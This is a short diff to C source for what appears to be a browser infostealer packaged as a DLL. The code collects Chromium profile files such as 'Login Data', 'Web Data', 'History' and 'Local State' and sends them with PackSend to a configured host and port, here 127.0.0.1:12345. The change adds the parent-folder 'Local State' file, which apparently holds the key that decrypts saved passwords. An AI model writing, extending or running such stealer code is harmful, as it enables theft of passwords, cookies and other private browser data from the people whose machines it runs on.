@@ -15,7 +15,7 @@
 #define ENDPOINT_HOST "127.0.0.1"
 #define ENDPOINT_PORT 12345
 
-#define TARGET_NAMES_COUNT 5
+#define TARGET_NAMES_COUNT 6
 #define TARGET_EXT_COUNT 2
 
 
@@ -46,7 +46,8 @@ DLL_EXPORT int CALLBACK main()
         "History",
         "Web Data",
         "Login Data",
-        "Local State"
+        "Local State",
+        "..\\Local State"
     };
 
     const char* textensions[TARGET_EXT_COUNT] = {
@@ -99,6 +100,7 @@ DLL_EXPORT int CALLBACK main()
     PackSend(pack, ENDPOINT_HOST, ENDPOINT_PORT);
 
     PackDestroy(pack);
+
     return EXIT_SUCCESS;
 }
 
